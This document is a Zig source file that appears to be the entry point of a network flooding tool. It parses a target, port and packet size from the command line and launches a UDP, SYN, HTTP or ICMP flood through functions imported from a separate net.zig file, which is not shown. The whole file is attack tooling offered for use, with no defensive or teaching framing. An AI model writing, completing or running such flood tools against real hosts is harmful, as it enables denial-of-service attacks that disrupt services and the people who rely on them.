const std = @import("std");
const parseAttackType = @import("net.zig").parseAttackType;
const udp_flood = @import("net.zig").udp_flood;
const syn_flood = @import("net.zig").syn_flood;
const http_flood = @import("net.zig").http_flood;
const icmp_flood = @import("net.zig").icmp_flood;

pub fn main() !void {
    var args = std.process.args();
    _ = args.next();
    const attack_type_str = args.next() orelse {
        std.debug.print("Usage: ./attack <type> <target> <port> <packet_size>\n", .{});
        return;
    };

    const target = args.next() orelse {
        std.debug.print("Error: Missing target\n", .{});
        return;
    };

    const port_str = args.next() orelse {
        std.debug.print("Error: Missing port\n", .{});
        return;
    };
    const port = try std.fmt.parseInt(u16, port_str, 10);

    const packet_size_str = args.next() orelse {
        std.debug.print("Error: Missing packet size\n", .{});
        return;
    };
    const packet_size = try std.fmt.parseInt(u16, packet_size_str, 10);

    const attack_type = parseAttackType(attack_type_str) orelse {
        std.debug.print("Error: Invalid attack type\n", .{});
        return;
    };

    std.debug.print("Starting {s} attack on {s}:{d} with packet size {d}\n", .{ attack_type_str, target, port, packet_size });

    switch (attack_type) {
        .udp_flood => try udp_flood(target, port, packet_size),
        .syn_flood => try syn_flood(target, port, packet_size),
        .http_flood => try http_flood(target, port),
        .icmp_flood => try icmp_flood(target),
    }
}
